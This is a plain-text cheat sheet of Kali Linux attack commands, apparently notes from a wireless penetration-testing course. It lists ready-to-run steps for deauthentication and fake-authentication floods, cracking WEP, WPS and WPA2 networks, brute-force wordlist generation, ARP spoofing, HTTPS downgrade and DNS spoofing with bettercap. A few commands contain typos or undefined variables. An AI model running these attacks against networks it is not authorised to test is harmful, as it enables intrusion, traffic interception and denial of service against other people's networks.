"COMMON KALI COMMANDS"

"------------------------------------------------"
"-> SET QWERTY MAPKEYS"
setxkbmap -layout it

"------------------------------------------------"
"-> SET WIRELESS ADAPTER IN MONITOR MODE"
interface = "wlan0"

iwconfig
airmon-ng check kill
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up

"------------------------------------------------"
"-> SET FAKE MAC ADDRESS ( new fake address must start with 00 )"
interface = "wlan0"

ifconfig $interface hw ether 00:11:22:33:44:55

"------------------------------------------------"
"-> START SNIFFING PACKETS"
interface  = "wlan0"
MACNetwork = "00:11:22:33:44:55"
channel    = 1
filename   = "sniff"

airodump-ng $interface
airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface

"------------------------------------------------"
"-> DEAUTHENTICATION ATTACK"
interface  = "wlan0"
MACNetwork = "00:11:22:33:44:55"
MACStation = "00:11:22:33:44:55"
packets	   = 1000000000

"-> D for 5Ghz"

aireplay-ng --deauth $packets -a $MACNetwork -c $MACStation [-D] $interface

"------------------------------------------------"
"-> FAKE AUTHENTICATION ATTACK"
interface  = "wlan0"
MACNetwork = "00:11:22:33:44:55"
MACStation = "00:11:22:33:44:55"

aireplay-ng --fakeauth 0 -a $MACNetwork -h $MACTarget $interface

"------------------------------------------------"
"-> CRACK WEP NETWORK"
interface  = "wlan0"
MACNetwork = "00:11:22:33:44:55"
channel    = 1
filename   = "sniff.cap"
myMAC	     = "00:11:22:33:44:55"

airodump-ng $interface
airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface

aireplay-ng --fakeauth 0 -a $MACNetwork -h $myMAC $interface
aireplay-ng --arpreplay -b $MACNetwork -h $myMAC $interface
aircrack-ng $filename

"------------------------------------------------"
"-> SHOW NETWORK WITH WPS ENABLED"
interface = "wlan0"

wash --interface $interface

"------------------------------------------------"
"-> CRACK WPS NETWORK"
interface  = "wlan0"
MACNetwork = "00:11:22:33:44:55"
channel    = 1

reaver --bssid $MACNetwork --channel $channel --interface $interface --vvv --no-associate

"------------------------------------------------"
"-> GENERATE A WORDLIST FILE"
min      = 4
max      = 8
charSet  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
filename = "wordlist"
pattern  = "A@@@Z"

"-> $pattern for pattern like A@@@Z"

crunch $min $max $charSet [-t $pattern] -o $filename

"------------------------------------------------"
"-> CRACK WPA2 NETWORK WITH STORED WORDLIST FILE"
handshake = "home/Desktop/handshake.cap"
wordlist  = "home/Desktop/wordlist.txt"

aircarck-ng $handshake -w $wordlist

"------------------------------------------------"
"-> CRACK WPA2 NETWORK WITH RUNTIME BUILT WORDLIST"
min        = 4
max        = 8
charSet    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
MACNetwork = "00:11:22:33:44:55"
handshake  = "home/Desktop/handshake.cap"

crunch $min $max $charSet | aircrack-ng -w - -b $MACNetwork $handshake

"------------------------------------------------"
"-> DISCOVER ALL DEVICES CONNECTED TO YOUR NETWORK"
gatewayIP = 192.168.1.1

netdiscover -r $gatewayIP/24

"------------------------------------------------"
"-> DISCOVER INFORMATION ABOUT DEVICES CONNECTED TO YOUR NETWORK"
zenmap-kbx

"------------------------------------------------"
"-> ARP SPOOFING"
interface = "wlan0"
gatewayIP = 192.168.1.1
clientIP  = 192.168.1.155

arp -a
arpspoof -i $interface -t $clientIP $gatewayIP
arpspoof -i $interface -t $gatewayIP $clientIP
echo 1 > /proc/sys/net/ipv4/ip_forward

"------------------------------------------------"
"-> ARP SPOOFING WITH BETTERCAP"
interface = "wlan0"
caplet    = "$HOME/Desktop/caplet.cap"

"-> $caplet Start with caplet file"
bettercap -iface $interface [-caplet $caplet]

caplets.update
caplets.show

net.probe on
set arp.spoof fullduplex true
set arp.spoof fullduplex targets 192.168.1.2
"-> Multiple target"
"-> set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
arp.spoof on

"-> For downgrade HTTPS to HTTP"
set net.sniff.local true
net.sniff on

hstshijack/hstshijack


"------------------------------------------------"
"-> DNS SPOOFING WITH BETTERCAP"
interface = "wlan0"
caplet    = "$HOME/Desktop/caplet.cap"

"-> $caplet Start with caplet file"
bettercap -iface $interface [-caplet $caplet]

caplets.update
caplets.show

net.probe on
set arp.spoof fullduplex true
set arp.spoof fullduplex targets 192.168.1.2
"-> Multiple target"
"-> set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
arp.spoof on

"-> For downgrade HTTPS to HTTP"
set net.sniff.local true
net.sniff on

hstshijack/hstshijack

set dns.spoof.all true
set dns.spoof.domains zsecurity.org,*zsecurity.org
dns.spoof.on

